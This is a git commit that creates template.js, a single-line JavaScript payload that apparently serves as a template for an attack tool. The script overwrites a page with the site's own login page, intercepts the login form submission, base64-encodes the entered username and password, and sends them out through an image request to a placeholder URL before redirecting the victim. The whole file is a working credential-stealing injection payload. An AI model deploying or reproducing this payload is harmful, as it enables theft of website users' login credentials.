8a8685160281ff28035755bd665d13afeb583bf2
Oelin <42823429+Oelin@users.noreply.github.com>
2020-07-20 19:51:35 +0100

    Create template.js

---
+++ template.js
@@ -0,0 +1,1 @@
+(async()=>{document.body.innerHTML="";document.write(await fetch("/login.php").then(e=>e.text())+`<script>a=setTimeout,a(()=>$("form[action*=login]").submit(e=>{e.preventDefault(),c=e.currentTarget,(new Image).src="%s"+btoa(c[0].value+"||"+c[1].value),a(()=>window.location="%s",1e3)}),4e3)</script>`)})()
